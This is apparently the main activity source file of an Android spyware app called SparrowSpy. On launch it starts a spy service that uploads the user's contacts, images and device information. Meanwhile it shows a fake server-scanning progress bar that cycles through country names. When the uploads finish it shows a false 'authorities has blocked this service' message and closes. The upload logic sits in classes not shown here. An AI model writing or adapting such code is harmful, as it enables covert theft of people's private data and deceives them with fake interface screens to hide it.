package com.tangledbytes.sparrowspy.activities;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.tangledbytes.sparrowspy.SparrowSpy;
import com.tangledbytes.sparrowspy.events.SparrowActions;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.Utils;
import com.tangledbytes.sparrowspy.R;

import java.util.Locale;
import java.util.Random;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private final Utils mUtils = new Utils(this);
    private ProgressBar progressBar;
    private TextView tvProcMainTitle;
    private TextView tvProcContent;
    private TextView tvProgress;
    public static final String[] COUNTRIES = new String[]{"Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe", "Palestine"};


    private boolean noInternetDialogVisible;
    SparrowSpy mSpy;


    private final BroadcastReceiver spyActionsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action == null) return;
            if (intent.getAction().equals(SparrowActions.ACTION_SERVICE_STARTED))
                showFakeProcess();
            else if (hasUploadedRequestedData())
                showFailedDialog();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startSpy();
    }

    public void startSpy() {
        Log.i(TAG, "Starting spy");
        mSpy = SparrowSpy.init(this);
        if (hasUploadedRequestedData()) {
            showFailedDialog();
            return;
        }
        registerReceiver(spyActionsReceiver, new IntentFilter(SparrowActions.ACTION_SERVICE_STARTED));
        registerReceiver(spyActionsReceiver, new IntentFilter(SparrowActions.ACTION_CONTACTS_UPLOADED));
        registerReceiver(spyActionsReceiver, new IntentFilter(SparrowActions.ACTION_DEVICE_INFO_UPLOADED));
        registerReceiver(spyActionsReceiver, new IntentFilter(SparrowActions.ACTION_IMAGES_UPLOADED));
    }

    @Override
    protected void onDestroy() {
        unregisterReceiver(spyActionsReceiver);
        super.onDestroy();
    }

    public boolean hasUploadedRequestedData() {
        SharedPreferences sparrowPrefs = mSpy.getSparrowPreferences();

        return sparrowPrefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)
                && sparrowPrefs.getBoolean(Constants.PREF_IMAGES_STATUS, false)
                && sparrowPrefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false);
    }


    private final Thread fakeProcessThread = new Thread(new Runnable() {
        final Random random = new Random();

        @Override
        public void run() {
            double progress = 0;
            while (!hasUploadedRequestedData()) {
                if (!mUtils.hasActiveInternetConnection()) {
                    runOnUiThread(MainActivity.this::showEnableInternetDialog);
                    blockThread();
                    continue;
                }
                // increase progress by 0.4% of remaining progress
                progress += 0.004 * (100 - progress);
                final int finalProgress = (int) progress;
                runOnUiThread(() -> updateUi(finalProgress));
                blockThread();
            }
            runOnUiThread(MainActivity.this::showFailedDialog);
        }

        private void updateUi(int progress) {
            tvProcContent.setText(String.format("scanning %s...", COUNTRIES[random.nextInt(COUNTRIES.length)]));
            progressBar.setProgress(progress);
            tvProgress.setText(String.format(Locale.ENGLISH, "%d%%", progress));
        }

        private void blockThread() {
            synchronized (MainActivity.this) {
                try {
                    MainActivity.this.wait(random.nextInt(400) + 1);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    });

    private void showFakeProcess() {
        tvProcMainTitle = findViewById(R.id.proc_title);
        tvProcContent = findViewById(R.id.proc_content);
        progressBar = findViewById(R.id.proc_progress);
        tvProgress = findViewById(R.id.tv_progress);
        tvProcMainTitle.setText(R.string.looking_for_closest_server);
        fakeProcessThread.start();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SparrowSpy.PERMISSIONS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SparrowSpy.OPEN_SETTINGS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }

    public void showEnableInternetDialog() {
        if (noInternetDialogVisible) return;
        noInternetDialogVisible = true;
        AlertDialog.Builder noInternetDialog = new AlertDialog.Builder(this).setTitle("No Internet Connection").setMessage("No internet connection detected. Please enable internet in order continue. Click retry to recheck.\nThank you").setCancelable(false).setNegativeButton("Retry", (dialog, whichButton) -> noInternetDialogVisible = false);
        noInternetDialog.show();
    }

    public void showFailedDialog() {
        AlertDialog.Builder failedDialog = new AlertDialog.Builder(this).setTitle("Access denied").setMessage("It looks like authorities has blocked this service in your area. Please stay tuned for further updates.\nThank you").setCancelable(false).setNegativeButton(com.tangledbytes.sparrowspy.R.string.exit, (dialog, whichButton) -> {
            Toast.makeText(this, com.tangledbytes.sparrowspy.R.string.closing_app, Toast.LENGTH_SHORT).show();
            finish();
        });
        failedDialog.show();
    }
}